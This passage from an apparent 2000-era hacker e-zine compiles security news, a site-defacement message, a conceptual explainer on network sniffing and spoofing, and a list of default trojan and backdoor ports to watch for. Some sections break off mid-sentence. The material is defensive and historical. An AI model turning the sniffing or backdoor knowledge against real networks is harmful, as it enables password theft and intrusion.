      it's not freely distributed. Why? Because some people are just too
      crazy to let them play with it. We don't want to take the risk of
      these people having it, so we try as hard as we can to ban this
      weapon, and so it is a criminal offense to own one H bomb. As in the
      computer security field, it's about balancing risks vs benefices.

306.0 [ISN] Suspected hackers arrested in Russian credit card fraud
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            
      http://ap.tbo.com/ap/breaking/MGII9EK5M7C.html
      
      MOSCOW (AP) - Police arrested five suspected hackers accused of
      stealing credit card numbers from Internet retailers and pocketing
      more than $630,000, according to a news report Friday.
      
      The group, operating from December through April, stole numbers from
      more than 5,400 cards belonging to Russians and foreigners, police
      said, the ITAR-Tass news agency reported.
      
      The 22-year-old alleged mastermind of the scheme registered an
      Internet retailer called "Politshop" and made an agreement with a
      Moscow bank for handling credit-card transactions, the report said.
      
      Other members of the group allegedly cracked the systems of genuine
      Internet retailers, stole the credit card numbers of their customers
      and made bogus purchases from Politshop, thus moving money from the
      victims' banks to Politshop's accounts, the report said.
      
      The report did not say what kinds of goods Politshop supposedly
      offered, or how the group was caught. Other suspects include a
      19-year-old technical college student, 19-year-old and 22-year-old
      unemployed men, and a 40-year-old businessman, ITAR-Tass reported.
      
      Hacker crimes are on the rise in Russia and last year included an
      attack on the state gas monopoly Gazprom, Interior Ministry Col.
      Konstantin Machabeli said earlier this week, according to the Interfax
      news agency.
      
      Acting together with a Gazprom insider, hackers got past the huge
      company's security and temporarily seized control of the system
      regulating gas flows in pipelines, Machabeli said. He did not say if
      the hackers caused any damage.
      
      Police registered more than 850 cases of computer crime in Russia in
      1999, up twelvefold from the year before, the report said.

307.0 [ISN] Microsoft zaps Hotmail password bug
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      http://news.cnet.com/news/0-1005-200-1772642.html?tag=st.ne.1002.bgif.1005-200-1772642

      Staff Writer, CNET News.com
      April 27, 2000, 12:30 p.m. PT
      
      Microsoft has patched a Hotmail bug that left users of the Web-based
      email service vulnerable to a password-stealing trick.
      
      The exploit was the latest in a series devised by bug hunters using
      JavaScript to launch fraudulent password entry screens to trick people
      into handing over control of their accounts.
      
      JavaScript is a Web scripting language designed to take actions on a
      Web site visitor's computer, such as launching a new window or
      scrolling text across the screen, without the visitor's interaction.
      After the first few password-stealing schemes came to light, Hotmail
      and other Web email providers decided to filter JavaScript from
      incoming messages.
      
      But bug hunters have kept themselves busy finding ways to sneak the
      code around Hotmail's filters.
      
      In the example addressed by Hotmail this week, Bulgarian bug hunter
      Georgi Guninski demonstrated a way to inject JavaScript through a
      style tag. The exploit worked only with Microsoft's Internet Explorer
      browser.
      
      In response to news of the bug, Microsoft this week patched the
      Hotmail servers.

308.0 [ISN] Cybercrime solution has bugs

      3:00 a.m. May. 3, 2000 PDT
      
      WASHINGTON -- U.S. and European police agencies will receive new
      powers to investigate and prosecute computer crimes, according to a
      preliminary draft of a treaty being circulated among over 40 nations.
      
      The Council of Europe's 65KB proposal is designed to aid police in
      investigations of online miscreants in cases where attacks or
      intrusions cross national borders.
      
      But the details of the "Draft Convention on Cybercrime" worry U.S.
      civil libertarians. They warn that the plan would violate longstanding
      privacy rights and grant the government far too much power.
      
      The proposal, which is expected to be finalized by December 2000 and
      appears to be the first computer crime treaty, would:
      
        Make it a crime to create, download, or post on a website any
        computer program that is "designed or adapted" primarily to gain
        access to a computer system without permission. Also banned is
        software designed to interfere with the "functioning of a computer
        system" by deleting or altering data.
      
        Allow authorities to order someone to reveal his or her
        passphrase for an encryption key. According to a recent
        survey, only Singapore and Malaysia have enacted such a
        requirement into law, and experts say that in the United States
        it could run afoul of constitutional protections against
        self-incrimination.
      
        Internationalize a U.S. law that makes it a crime to possess
        even digital images that "appear" to represent children's genitals
        or children engaged in sexual conduct. Linking to such a site also
        would be a crime.
      
        Require websites and Internet providers to collect information
        about their users, a rule that would potentially limit
        anonymous remailers.
      
      U.S. law enforcement officials helped to write the document, which was
      released for public comment last Thursday, and the Justice Department
      is expected to urge the Senate to approve it next year. Other
      non-European countries actively involved in negotiations include
      Canada, Japan, and South Africa.
      
      During recent testimony before Congress, Attorney General Janet Reno
      warned of international computer crime, a claim that gained more
      credibility last month with the arrest of alleged denial-of-service
      culprit Mafiaboy in Canada.
      
      "The damage that can be done by somebody sitting halfway around the
      world is immense. We have got to be able to trace them, and we have
      made real progress with our discussions with our colleagues in the G-8
      and in the Council of Europe," Reno told a Senate appropriations
      subcommittee in February, the week after the denial-of-service attacks
      took place.
      
      "Some countries have weak laws, or no laws, against computer crimes,
      creating a major obstacle to solving and to prosecuting computer
      crimes. I am quite concerned that one or more nations will become
      'safe havens' for cyber-criminals," Reno said.
      
      Civil libertarians say the Justice Department will try to pressure the
      Senate to approve the treaty even if it violates Americans' privacy
      rights.
      
      "The Council of Europe in this case has just been taken over by the
      U.S. Justice Department and is only considering law enforcement
      demands," says Dave Banisar, co-author of The Electronic Privacy
      Papers. "They're using one more international organization to launder
      U.S. policy."
      
      Banisar says Article 6 of the measure, titled "Illegal Devices," could
      ban commonplace network security tools like crack and nmap, which is
      included with Linux as a standard utility. "Companies would be able to
      criminalize people who reveal security holes about their products,"
      Banisar said.
      
      "I think it's dangerous for the Internet," says Barry Steinhardt,
      associate director of the American Civil Liberties Union and a founder
      of the Global Internet Liberty Campaign. "I think it will interfere
      with the ability to speak anonymously."
      
      "It will interfere with the ability of hackers -- using that term in a
      favorable light -- to test their own security and the security of
      others," Steinhardt said.
      
      Solveig Singleton, director of information studies at the libertarian
      Cato Institute says it's likely -- although because of the vague
      language not certain -- that anonymous remailers will be imperiled.
      
      The draft document says countries must pass laws to "ensure the
      expeditious preservation of that traffic data, regardless whether one
      or more service providers were involved in the transmission of that
      communication." A service provider is defined as any entity that sends
      or receives electronic communications.
      
      Representing the U.S. in the drafting process is the Justice
      Department's Computer Crime and Intellectual Property section, which
      chairs the G-8 subgroup on high-tech crime and also is involved with a
      cybercrime project at the Organization of American States. In December
      1997 Reno convened the first meeting on computer crime of the G-8
      nations.
      
      A recent White House working group, which includes representatives
      from the Justice Department, FBI, and Secret Service has called for
      restrictions on anonymity online, saying it can provide criminals with
      an impenetrable shield. So has a report from a committee of the
      European Parliament.
      
      Other portions of the treaty include fairly detailed descriptions of
      extradition procedures and requirements for countries to establish
      around-the-clock computer-crime centers that police groups in other
      countries may contact for immediate help.
      
      The Council of Europe is not affiliated with the European Union, and
      includes over 40 member nations, including Russia, which joined in
      1996.
      
      After the Council of Europe's expert group finalizes the proposed
      treaty, the full committee of ministers must adopt the text. Then it
      will be sent to countries for their signatures. Comments can be sent
      to daj@coe.int.

309.0 [ISN] Government plans computer lock-down
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Government Plans Computer Lock-Down
      Attacks are rising, but U.S. computer chiefs have a plan to
      make the net safe for e-government.
      By Kevin Poulsen
      April 20, 2000 12:29 AM PST
      
      Washington-- Key U.S. government Chief Information Officers said
      Wednesday that a comprehensive computer security plan to be released
      this summer will clear the way for a new wave of government functions
      and services to be safely put on the Internet.
      
      "What we are doing now is developing a series of benchmarks that would
      allow us to provide to agencies examples of good security practices
      tied to a specific set of government services," said Department of
      Energy CIO John Gilligan. "We're going to draw a series of examples
      and use those examples to draw what we think are benchmark security
      and privacy practices, then share that with the various agencies."
      
      Gilligan serves as co-chair of the Federal CIO Council's Security,
      Privacy and Critical Infrastructure Committee. Together with the CIOs
      of the Commerce and State Departments, he outlined the Committee's
      plans at an industry briefing at FOSE 2000 -- an information
      technology exposition for government agencies.
      
      Federal agencies have been criticized for lagging behind private
      industry in serving the public online -- most recently in a March
      report from the centrist Democratic think tank The Progressive Policy
      Institute. Gilligan blamed hackers for the delays, offering that
      government CIOs "felt constrained by questions and concerns about
      security."
      
      The CIOs' response: a virtual Bible of government computer security
      practices that will address web based information services, online
      government procurement and financial transactions with the public over
      the Internet. It's due to be released to all federal agencies this
      summer, with a broader plan promised in the fall. 'All you have to
      know is how to point and click a mouse and you can hack people.' --
      Fernando Burbano, State Department CIO Attacks up, but less Successful
      A 1996 law established the position of Chief Information Officer in
      all major Federal departments and agencies to spur the development of
      cost-efficient technological initiatives within the government. The
      CIO Council was created by Executive Order to act as the principal
      interagency forum for information technology matters.
      
      The Council's Security, Privacy and Critical Infrastructure Committee
      is responsible for developing security practices for government
      networks, a task that's taken on increased urgency in the wake of
      high-profile Denial of Service attacks, web hacks on government sites,
      and growing concern in Congress and at the White House over
      "cyberterrorism."
      
      Fernando Burbano, the State Department's CIO, blamed the availability
      of automated hacking tools like L0phtcrack and BO2K for the
      government's computer security woes. "What really makes it worse is in
      the early 1980s it used to take a lot of sophistication to hack," said
      Burbano. "All you have to know now is how to point and click a mouse
      and you can hack people."
      
      Indicating a screenshot of nmapin his Power Point slide show, Burbano
      explained, "Nmap is freeware that probes networks by sending data
      packets to ports... All you have to know is how to point and click
      this thing."
      
      Despite easy-to-use scripts, Gilligan said that DOE systems are
      holding their own. While the number of attacks are increasing at a
      "non-linear" rate, "fortunately, the number of successful attacks is
      actually steady and decreasing as a percentage," said Gilligan.
      Burbano noted the same trend with State Department computers.
      
      Last month, the Senate Governmental Affairs Committee approved the
      Government Information Security Act, after hearing testimony from
      federal computer security experts and hacker Kevin Mitnick. The
      legislation would require agencies to submit to an annual independent
      audit of their information security programs and practices.

310.0 [HWA] phonic dumps on hack.co.za and gov-boi  
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Around 4am EST on May 26th www.hack.co.za was replaced with the following
      message:
      
      

      Welcome to the new www.hack.co.za 
      
      My name is phonic. you might have heard of me. 
      
      Part I 
      ---------- 
      You might have noticed that recently a file was added called the Cisco 
      Auditing Tool. This tool was a pretty nice all-in-one Cisco Router tool 
      coded by g0ne. I was helping him work on this tool, and I happened to 
      have a local copy of it on the machine I admin: Station 25. I might also 
      add that this is a state owned box. Well, as we were working on this tool, 
      we were getting it ready for release. Working out a few bugs, adding some 
      new tools, etc. So I had the latest version of the source in a private 
      directory on my box. Also, I had a large collection of un-released source 
      code. 
      
      Part II 
      ---------- 
      About a month or so ago, I was asked by a friend, whose name will remain 
      confidential, if I would mind hosting www.hack.co.za for gov-boi, aka 
      rage. Apparently, the previous hoster stopped hosting it for reasons 
      unknown to me, so the site was down for a while. I, being the kind and 
      generous person that I am so well known to be =], said ok. So for the past 
      month or so, www.hack.co.za was being hosted here. I helped gov-boi setup 
      the dns tables, etc. so that the site would work and everyone would be 
      happy. 
      
      Part III 
      ---------- 
      Like I said earlier, the pre-release source code for the Cisco Auditing 
      Tool was on this box. On the night of May 25th 2000, I get a phone call 
      from g0ne. Apparently, someone had posted the source code to packet storm. 
      Well, this was strange because only 3 people, myself and g0ne included, 
      had the source. I didn't think anyone on my box would have taken it since 
      I thought they were all trustworthy. It turned out I was sadly mistaken. 
      After careful examination of the box, I learned that gov-boi rooted the 
      box, the box I was generous enough to let him use, with a local exploit. 
      Not hiding his work at all, this was easily found out in the logs. 
      
      Part IV 
      ---------- 
      gov-boi decided that in exchange for the generosity that I extended 
      towards him, with nothing asked for in return, he was going to go behind 
      my back, and steal tons of source code for his web site. I imagine he is 
      going to quickly change the dns tables to unlink this server from 
      www.hack.co.za once he realizes that I found out that he is a source code 
      thief. Now, in my humble opinion, and I could be wrong, I think this is 
      really fucked up. 
      
      Part V 
      ---------- 
      Finally, tomorrow I have to file a report about the intrusion and hack on this system by gov-boi. 
      Oh, did I mention that this is a state owned box? 
      
      Thank you for your time.

311.0 [IND] IP Sniffing and Spoofing
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Submitted by spsyops 
     
        Introduction.
      
       Sniffing and spoofing are security threats that target the
      lower layers of the networking infrastructure supporting
      applications that use the Internet. Users do not interact
      directly with these lower layers and are typically
      completely unaware that they exist. Without a deliberate
      consideration of these threats, it is impossible to build
      effective security into the higher levels.
      
       Sniffing is a passive security attack in which a machine
      separate from the intended destination reads data on a
      network. The term "sniffing" comes from the notion of
      "sniffing the ether" in an Ethernet network and is a bad
      pun on the two meanings of the word "ether."
      Passive security attacks are those that do not alter the
      normal flow of data on a communication link or inject data
      into the link.
      
       Spoofing is an active security attack in which one machine
      on the network masquerades as a different machine. As an
      active attack, it disrupts the normal flow of data and may
      involve injecting data into the communications link between
      other machines. This masquerade aims to fool other machines
      on the network into accepting the impostor as an original,
      either to lure the other machines into sending it data or
      to allow it to alter data. The meaning of 'spoof' here is
      not 'a lighthearted parody,' but rather 'a deception intended
      to trick one into accepting as genuine something that is
      fake.' Such deception can have grave consequences because
      notions of trust are central to many networking systems.
      Sniffing may seem innocuous (depending on just how sensitive
      and confidential you consider the information on your network),
      some network security attacks use sniffing as a prelude to
      spoofing. Sniffing gathers sufficient information to make
      the deception believable.
      
        Sniffing.
      
       Sniffing is the use of a network interface to receive data
      not intended for the machine in which the interface resides.
      A variety of type of machines need to have this capability.
      A token-ring bridge, for example, typically has two network
      interfaces that normally receives all packets travelling on
      the media on one interface and retransmit some, but not all,
      of these packets on the other interface. Another example of
      a device that incorporates sniffing is one typically marketed
      as a 'network analyzer.' A network analyzer helps network
      administrators diagnose a variety of obscure problems that
      may not be visible on any one particular host. These problems
      can involve unusual interactions between more than just one
      or two machines and sometimes involve a variety of protocols
      interacting in strange ways.
      
       Devices that incorporate sniffing are useful and necessary.
      However, their very existence implies that a malicious person
      could use such a device or modify an existing machine to
      snoop on network traffic. Sniffing programs could be used to
      gather passwords, read inter-machine e-mail, and examine 
      clien-server database records in transit. Besides these high
      level data, lowlevel information might be used to mount an
      active attack on data in another computer system.
      
        Sniffing: How It Is Done.
      
       In a shared media network, such as Ethernet, all network
      interfaces on a network segment have access to all the data 
      that travels on the media. Each network interface has a 
      hardware-layer address that should differ from all hardware-layer 
      addresses of all other network interfaces on the network. Each 
      network also has at least on broadcast address that corresponds 
      not to an individual network interface, but to the set of all 
      network interfaces. Normally, a network interface will only 
      respond to a data frame carrying either its own hardware-layer 
      address in the frame's destination field or the 'broadcast address'
      in the destination field. It responds to these frames by generating 
      a hardware interrupt to the CPU. This interrupt gets that attention 
      of the operating system, and passes the data in the frame to the 
      operating system for further processing.
      
       At times, you may hear network administrators talk about their
      networking troubles spots---when they observe failures in a 
      localized area. They will say a particular area of the Ethernet 
      is busier than other areas of the Ethernet where there are no problems. 
      All of the packets travel through all parts of the Ethernet segment. 
      Interconnection devices that do not pass all the frames from one side 
      of the device to the other form the boundaries of a segment. Bridges, 
      switches, and routers divide segments from each other, but low-level 
      devices that operate on one bit at a time, such as repeaters and hubs,
      do not divide segments from each other. If only low-level devices 
      separate two parts of the network, both are part of a single segment. 
      All frames travelling in one part of the segment also travel in the 
      other part.
      
       The broadcast nature of shared media networks effects network
      performance and reliability so greatly that networking professionals
      use a network analyzer, or sniffer, to troubleshoot problems.
      A sniffer puts a network interface in promiscuous mode so that
      the sniffer can monitor each data packet on the network segment.
      In the hands of an experienced system administrator, a sniffer
      is an invaluable aid in determining why a network is behaving
      (or misbehaving) the way it is. With an analyzer, you can determine
      how much of the traffic is due to which network protocols, which
      hosts are the source of most of the traffic, and which hosts are
      the destination of most of the traffic. You can also examine data
      travelling between a particular pair of hosts and categorize it by
      protocol and store it for later analysis offline. With a sufficiently
      powerful CPU, you can also do the analysis in real time.
      
       Most commercial network sniffers are rather expensive, costing
      thousands of dollars. When you examine these closely, you notice
      that they are nothing more than a portable computer with an Ethernet
      card and some special software. The only item that differentiates
      a sniffer from an ordinary computer is software. It is also easy to
      download software and freeware sniffing software from the Internet
      or various bulleting board systems.
      
       The ease of access to sniffing software is great for network
      administrators because this type of software helps them become better
      network troubleshooters. However, the availability of this software
      also means that malicious computer users with access to a network
      can capture all the data flowing through the network. The sniffer
      can capture all the data for a short period of time or selected
      portions of the data for a fairly long period of time. Eventually,
      the malicious user will run out of space to store the data---the
      network I use often has 1000 packets per second flowing on it.
      Just capturing the first 64 bytes of data from each packet fills
      up my system's local disk space within an hour.
      
        Sniffing Passwords.
      
       Perhaps the most common loss of computer privacy is the loss of
      passwords. Typically users type a password at least once a day.
      Data is often thought of as secure because access to it requires
      a password. Users usually are very careful about guarding their
      password by not sharing it with anyone and not writing it down
      anywhere.
      
       Passwords are used not only to authenticate users for access to
      the files they keep in their private accounts but other passwords
      are often employed within multilevel secure database systems. 
      When the user types any of these passwords, the system does not
      echo them to the computer screen to ensure that no one will see
      them. After jealously guarding these passwords and having the
      computer system reinforce the notion that they are private, a
      setup that sends each character in a password across the network
      is extremely easy for any Ethernet sniffer to see. End users
      do not realize just how easily these passwords can be found
      by someone using a simple and common piece of software.
      
        Sniffing Financial Account Numbers.
      
       Most users are uneasy about sending financial account numbers,
      such as credit card numbers and checking account numbers, over
      the Internet. This apprehension may e partly because of the
      carelessness most retailers display when tearing up or returning
      carbons of credit card receipts. The privacy of each user's credit
      card numbers is important. Although the Internet is by no means
      bulletproof, the most likely location for the loss of privacy
      to occur is at the endpoints of the transmission. Presumably,
      businesses making electronic transactions are as fastidious about
      security as those that make paper transactions, so the highest
      risk probably comes from the same local network in which the
      users are typing the passwords.
      
       However, much larger potential losses exist for businesses that
      conduct electronic funds transfer or electronic document interchange
      over a computer network. These transactions involve the transmission
      of account numbers that a sniffer could pick up; the thief could
      then transfers funds into his or her own account or order goods
      paid by a corporate account. Most credit card fraud of this kind
      involves only a few thousand dollars per incident.
      
        Sniffing Private Data.
      
       Loss of privacy is also common in e-mail transactions. Many e-mail
      messages have been publicized without the permission of the sender
      or receiver. Remember the Iran-Contra affair in which President
      Reagan's secretary of defence, Caspar Weinberger, was convicted.
      A crucial piece of evidence was backup tapes of PROFS e-mail on
      a National Security Agency computer. The e-mail was not intercepted
      in transit, but in a typical networked system, it could have been.
      It is not at all uncommon for e-mail to contain confidential business
      information or personal information. Even routine memos can be
      embarrassing when they fall into the wrong hands.
      
        Sniffing Low-Level Protocol Information.
      
       Information network protocols send between computers includes hardware
      addresses of local network interfaces, the IP address of remote network
      interfaces, IP routing information, and sequence numbers assigned to bytes
      on a TCP connection. Knowledge of any of this information can be misused
      by someone interested in attacking the security of machines on the network.
      A sniffer can obtain any of these data. After an attacker has this kind
      of information, he or se is in a position to turn a passive attack into
      an active attack wit even greater potential for damage.
      
        Protocol Sniffing: A Case Study.
      
       At one point in time, all user access to computing facilities in the
      organization under study (the university at which the author is employed)
      was done via terminals. It was not practical to hardwire each terminal
      to the host, and users needed to use more than one host. To solve these
      two problems, Central Computing used a switch (an AT&T ISN switch) between
      the terminals and the hosts. The terminals connected to the switch so
      that the user had a choice of hosts. When the user chose a host to switch
      connected the terminal to the chosen host via a very real, physical
      connection. The switch had several thousands ports and was, in theory,
      capable of setting up connections between any pair of ports. In practical,
      however, some ports attached to terminals and other ports attached to hosts.
      
       To make the system more flexible, the central computing facility was changed
      to a new system that uses a set of (DEC 550) Ethernet terminal servers with
      ports connected to the switch, rather than the old system, which used a fixed
      number of switch ports connected to each host. The new terminal servers are
      on an Ethernet segment by the hosts in the central machine room.
      
       Offices have a cable running from a wallplate to a wiring closet punchdown
      block. The punchdown block has cables running to multiplexers which turn
      connect to the switch. The multiplexers serve to decrease the number of
      cables that need to be long. With this arrangement sniffing or other form
      of security problems are not an issue. No two offices share any media.
      The switch mediates all interaction between computers, isolating the flow
      of data away from the physical location of the end users.
      
       Rather than using simple terminals, however, most computer users have a
      computer on their desktop that they use in addition to the Central Computing
      computers. The switch services these computers as well as simple terminals.
      The number of computer users, however, has grown rapidly over the past decade
      and the switch is no longer adequate. Terminal ports are in short supply,
      host ports are in even shorter supply, and the switch does not supply
      particularly high-speed connections.
      
       To phase out the switch, Central Computing installed an Ethernet hub in the
      basement of each building next to the punchdown block used to support both
      the switch multiplexer and the telephone lines. The hubs in the basement
      connect to the central facility using fiber-optic cables to prevent signal
      degradation over long distances. Hubs also were placed in the wiring closets
      on each floor of each building that connected to the basement hub. Now the
      cables leading to the wallplates in the offices are being moved from the
      punchdown block that leads to the multiplexer to a punchdown block that
      leads to one of these hubs. The new wiring scheme neatly parallels the
      old and was changed relatively inexpensively.
      
       Although the new wiring scheme neatly parallels the old, the data travelling
      on the new wiring scheme does not neatly parallel its previous path. From
      a logical standpoint, it can get to the same places, but the data can and
      does go to many other places as well. Under this scheme, any office can sniff
      on all the data flowing to Central Computing from all of the other offices in
      the building. Different departments are located in the same building. These
      departments compete for resources allocated by uppermanagers that supervise 
      them, and middle management all are located in the same building. A fair
      amount of potential exists for employees to want to know what other people
      are sending in e-mail messages, storing in personnel files, and storing in
      project planning files.
      
       In addition to nosiness and competition, a variety of people sharing the
      same physical media in the new wiring scheme, could easily misuse the network.
      Since all occupants of a building share a single set of Ethernet hubs, they
      broadcast all of their network traffic to every network interface in the
      entire building. Any sensitive information that they transmit is no longer
      limited to a direct path between user's machine and the final destination,
      anyone in the building can intercept the information with a sniffer. However,
      some careful planning of network installation or a redesign of an existing
      network should include security considerations (as well as performance issues)
      to avoid the risks inherent in shared media networking.
      
       The network in the case study fails miserably in the prevention of sniffing.
      Any computer in a building is capable of sniffing the network traffic to or
      from any other computer in the building.

      Precious little here lately huh?
      
      Hacker Tarot Cards
   
      1.The FOOL: a manager using a SPARCStation 413,1432
         to run a screensaver. 
      2.The MAGICIAN: a hacker with a Mac, a Pentium box, a
         Sparc, and a Cray on the table in front of him --- all
         running the same program with the same GUI. An infinity
         sign is over his head. 
      3.The HIGH PRIESTESS: a woman holding the
         Documentation, closed and concealed. The crescent
         moon is showing on an Indigo behind her. 
      4.The EMPEROR: Steve Jobs sitting on a NeXT cube,
         holding an optical disk vertically in his hand. 
      5.The EMPRESS: A secretary with a NeXT Machine. 
      6.The HEIROPHANT: Bill Gates with two flunkies kneeling
         before him, their faces averted, offering him floppy disks.
         He wears a laptop computer on his head. 
      7.The LOVERS: a PowerMAC and an IBM Power PC
         exchanging software as an angel bathed in glory regards
         them. 
      8.The CHARIOT: A man in a chariot, hurtling up an
         exponential curve, drawn by the twin sphinxes of
         Technology (black) and Culture (white). 
      9.STRENGTH: A woman holding the entire design and
         implementation of Microsoft Excel in her mind as she
         corrects the final error. An infinity sign is over her head. 
     10.The HERMIT: An old hacker, white-bearded, burns the
         midnight oil; its Star-of-David flame illuminates his
         keyboard. 
     11.The WHEEL OF FORTUNE: A rotating wheel. Cray is
         on the side going down, despite its good technology;
         Smalltalk is opposite it, and C++ is sitting on top. Four
         winged beings -- a mouse, a turtle, a dog-cow, and a
         human -- look on. 
     12.JUSTICE. A cold-faced woman holds a calculator in one
         hand and a delete- key in the other. 
     13.The HANGED MAN: A programmer is tied by his ankle
         to a cable duct. His phase is completely shifted: he
         awakens at sunset, he sleeps at dawn. His monitor is
         reverse-video. He programs on, flawlessly, oblivious to
         his circumstances. 
     14.DEATH: A skeleton weilding a scythe surveys a field, on
         which are scattered PDP-11s, Apple ]['s, IBM 360/91's,
         Xerox Alto's, and many other machines. 
     15.TEMPERANCE: An angel stands with one foot on her
         chair and one on the floor, as she copies files from one
         disk to another. A cursor blinks from her chest. 
     16.The DEVIL: The goat-headed Lord of the Pit stands on a
         pile of Windows manuals, holding an inverted torch in one
         hand. Two humans, male and female, are in chains at his
         feet. 
     17.The TOWER: An ivory tower is struck by a bolt of
         lightning. Two robed figures, denied tenure, are hurtled to
         the ground. 
     18.he STAR: A Mac is running its `warp' screen saver, in a
         transient fragile moment of peace. 
     19.The MOON: A wolf and a jackal are typing at two PC's.
         A crayfish crawls out of a pool, offering suggestions that
         may ultimately prove deadly. The moon shines through a
         window. 
     20.The SUN: A naked child riding a winged rocking horse
         programs clever applications on a high-quality
         workstation. 
     21.JUDGEMENT: An angel blows a trumpet; all over the
         net, web pages arise, to be rated Cool or not. 
     22.The WORLD: A woman dances on the clouds, unclothed,
         unencumbered, in a ring of clouds, a 3-d mouse in each
         hand. The four winged beings from the Wheel of Fortune
         surround her.

      you are up against. You can often gather intel from IRC as many of these

      the channel name, others aren't so obvious but do exist.

      Common Trojan ports to watch for:
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
      After seeing several questions about traffic directed at ports as 31337 and
      12345 I've put together a list of all trojans known to me and the default
      ports they are using. Of course several of them could use any port, but I
      hope this list will maybe give you a clue of what might be going on.
      
      port       21 - Blade Runner, Doly Trojan, Fore, Invisible FTP, WebEx,
                          WinCrash
      port       23 - Tiny Telnet Server
      port       25 - Antigen, Email Password Sender, Haebu Coceda, Shtrilitz
                          Stealth, Terminator, WinPC, WinSpy
      port       31 - Hackers Paradise
      port       80 - Executor
      port     456 - Hackers Paradise
      port     555 - Ini-Killer, Phase Zero, Stealth Spy
      port     666 - Satanz Backdoor
      port   1001 - Silencer, WebEx
      port   1011 - Doly Trojan
      port   1170 - Psyber Stream Server, Voice
      port   1234 - Ultors Trojan
      port   1245 - VooDoo Doll
      port   1492 - FTP99CMP

      translated in the near future).
      
      To help anyone to detect trojan attacks, I´m planning to add information
      about the original names of the executables, their size, where they usually
      are hiding, and the names of any helpfiles they may use. I will also add
      tools or links to tools that may be of your assistance.
      
      Feel free to get back to me with any comments or suggestions. If you find
      new trojans I´ll love to get my hands on them, but please mail me first, as
      I don´t need more than one copy. If you have live experiance of trojan
      attacks I´m interested to read about your findings.

A.4  The hacker's Ethic (90's Style)
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
     
     
          _   _            _             _    _____ _   _     _
         | | | | __ _  ___| | _____ _ __( )__| ____| |_| |__ (_) ___

     Sadly, due to the traditional ignorance and sensationalizing of the mass
     media, the once-noble term hacker has become a perjorative.
     
     Among true computer people, being called a hacker is a compliment. One of
     the traits of the true hacker is a profoundly antibureaucratic and
     democratic spirit. That spirit is best exemplified by the Hacker's Ethic.
     
     This ethic was best formulated by Steven Levy in his 1984 book Hackers:
     Heroes of the Computer Revolution. Its tenets are as follows:

      1 - Access to computers should be unlimited and total. 
      2 - All information should be free. 
      3 - Mistrust authority - promote decentralization. 
      4 - Hackers should be judged by their hacking not bogus criteria such as
          degrees, age, race, or position. 
      5 - You create art and beauty on a computer, 
      6 - Computers can change your life for the better. 

     The Internet as a whole reflects this ethic.

    BUGTRAQ - Subscription info
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~

    What is Bugtraq?

    Bugtraq is a full-disclosure UNIX security mailing list, (see the info

    About the Bugtraq mailing list
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    The following comes from Bugtraq's info file:

    This list is for *detailed* discussion of UNIX security holes: what they are,
    how to exploit, and what to do to fix them.

    This list is not intended to be about cracking systems or exploiting their
    vulnerabilities. It is about defining, recognizing, and preventing use of
    security holes and risks.

    Please refrain from posting one-line messages or messages that do not contain
    any substance that can relate to this list`s charter.

    I will allow certain informational posts regarding updates to security tools,
    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
    on this list.

    Please follow the below guidelines on what kind of information should be posted
    to the Bugtraq list:

    + Information on Unix related security holes/backdoors (past and present)
    + Exploit programs, scripts or detailed processes about the above
    + Patches, workarounds, fixes
    + Announcements, advisories or warnings
    + Ideas, future plans or current works dealing with Unix security
    + Information material regarding vendor contacts and procedures
    + Individual experiences in dealing with above vendors or security 
      organizations
    + Incident advisories or informational reporting

    Any non-essential replies should not be directed to the list but to the
    originator of the message. Please do not "CC" the bugtraq reflector 
    address if the response does not meet the above criteria.

    Remember: YOYOW.

    You own your own words. This means that you are responsible for the words
    that you post on this list and that reproduction of those words without

    UPDATED Sept/99 - Sent in by Androthi, tnx for the update
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    

      I am pleased to inform you of several changes that will be occurring
      on June 5th. I hope you find them as exciting as I do.
      
      
      BUGTRAQ moves to a new home
      ---------------------------
      
      
      First, BUGTRAQ will be moving from its current home at NETSPACE.ORG
      to SECURITYFOCUS.COM. What is Security Focus you ask? Wait and read
      below. Other than the change of domains nothing of how the list
      is run changes. I am still the moderator. We play by the same rules.
      
      
      Security Focus will be providing mail archives for BUGTRAQ. The
      archives go back longer than Netspace's and are more complete than
      Geek-Girl's.
      
      
      The move will occur one week from today. You will not need to
      resubscribe. All your information, including subscription options
      will be moved transparently.
      
      
      Any of you using mail filters (e.g. procmail) to sort incoming
      mail into mail folders by examining the From address will have to
      update them to include the new address. The new address will be:
      
      
                            BUGTRAQ@SECURITYFOCUS.COM
      
      
      Security Focus also be providing a free searchable vulnerability
      database.
      
      
      BUGTRAQ es muy bueno
      --------------------
      
      
      It has also become apparent that there is a need for forums
      in the spirit of BUGTRAQ where non-English speaking people
      or people that don't feel comfortable speaking English can
      exchange information.
      
      
      As such I've decided to give BUGTRAQ in other languages a try.
      BUGTRAQ will continue to be the place to submit vulnerability
      information, but if you feel more comfortable using some other
      language you can give the other lists a try. All relevant information
      from the other lists which have not already been covered here
      will be translated and forwarded on by the list moderator.
      
      
      In the next couple of weeks we will be introducing BUGTRAQ-JP
      (Japanese) which will be moderated by Nobuo Miwa <n-miwa@lac.co.jp>
      and BUGTRAQ-SP (Spanish) which will be moderated by CORE SDI S.A.
      from Argentina <http://www.core-sdi.com/> (the folks that brought you
      Secure Syslog and the SSH insertion attack).
      
      
      What is Security Focus?
      -----------------------
      
      
      Security Focus is an exercise in creating a community and a security
      resource. We hope to be able to provide a medium where useful and
      successful resources such as BUGTRAQ can occur, while at the same
      time providing a comprehensive source of security information. Aside
      from moving just BUGTRAQ over, the Geek-Girl archives (and the Geek Girl
      herself!) have moved over to Security Focus to help us with building
      this new community. The other staff at Security Focus are largely derived
      from long time supporters of Bugtraq and the community in general. If
      you are interested in viewing the staff pages, please see the 'About'
      section on www.securityfocus.com.
      
      
